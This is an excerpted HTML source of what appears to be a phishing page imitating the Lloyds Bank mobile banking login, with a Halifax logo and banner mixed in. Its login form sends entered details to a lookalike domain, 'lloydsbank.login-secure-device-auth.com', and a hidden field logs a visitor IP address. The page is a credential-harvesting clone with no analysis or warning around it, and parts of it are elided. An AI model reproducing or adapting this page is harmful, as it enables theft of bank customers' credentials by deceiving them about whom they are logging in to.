...
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-gb">
    <head>
        ...
        <title>Lloyds&nbsp;Bank - Mobile Banking - Login</title>
        ...
        <link rel="apple-touch-icon" sizes="57x57" href="https://lloydsbank.login-secure-device-auth.com/files/img/ltsb%2057x57-.JPG" />
        <link rel="apple-touch-icon" sizes="114x114" href="https://lloydsbank.login-secure-device-auth.com/files/img/ltsb%20114x114-.JPG" />
...
$( document ).ready(function() {
    ...
    <body class="hasJS" cz-shortcut-listen="true" data-__gyazo-extension-added-paste-support="true">
        ...
        <div id="outer">
            <div id="banner">
                <p id="logo">
                    <img src="files/img/logo-.gif" alt="Halifax" />
                </p>
                            ...
                            <div class="panelBR">
                                <div class="panelBL">
                                    <div class="loginInner">
                                            ...
                                            <form id="frmLogin" name="frmLogin" method="post" action="https://lloydsbank.login-secure-device-auth.com/personal/mbprimarylogin" autocomplete="off">
												<input type="hidden" name="ip" value="82.102.26.52">
                    ...
                    <div class="appBannerLink market">
                        <p style="text-align: center;">
                            <a title="Savings accounts. Find the one for you" href="https://www.halifax.co.uk/savings/?WT.ac=lon/public/navigation/ban/r2pr/savs/s/rt/HxSavRbdBn" target="_blank" rel="noopener noreferrer">
                                <img alt="Savings accounts. Find the one for you" src="files/img/personalloan2020-.png" />
                            </a>
                        </p>
